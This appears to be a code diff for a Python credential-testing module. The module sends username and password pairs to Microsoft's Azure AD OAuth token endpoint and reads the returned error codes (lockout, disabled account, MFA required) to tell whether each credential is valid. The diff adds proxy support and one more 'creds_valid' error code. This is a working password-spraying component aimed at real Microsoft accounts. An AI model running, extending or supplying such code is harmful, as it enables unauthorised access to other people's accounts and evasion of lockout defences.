@@ -5,7 +5,8 @@ from . import DEFAULT_TIMEOUT as _TIMEOUT
 
 _TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
 
-def attempt(username: str, password: str) -> dict:
+
+def attempt(username: str, password: str, proxies: dict | None = None) -> dict:
     """
     Returns dict with keys: success (bool), locked (bool), notes (str).
     success=True means access_token was returned.
@@ -19,7 +20,7 @@ def attempt(username: str, password: str) -> dict:
         "password": password,
     }
     try:
-        r = requests.post(_TOKEN_URL, data=data, timeout=_TIMEOUT)
+        r = requests.post(_TOKEN_URL, data=data, timeout=_TIMEOUT, proxies=proxies)
         body = r.json() if r.content else {}
     except Exception as e:
         return {"success": False, "locked": False, "notes": f"request error: {e}"}
@@ -37,6 +38,8 @@ def attempt(username: str, password: str) -> dict:
         return {"success": False, "locked": True, "notes": "AADSTS50057: account_disabled"}
     if 50076 in error:
         return {"success": False, "locked": False, "notes": "AADSTS50076: MFA_required (creds_valid)"}
+    if 50079 in error:
+        return {"success": False, "locked": False, "notes": "AADSTS50079: MFA_enrollment_required (creds_valid)"}
 
     desc = body.get("error_description", body.get("error", "unknown"))[:120]
     return {"success": False, "locked": False, "notes": desc}
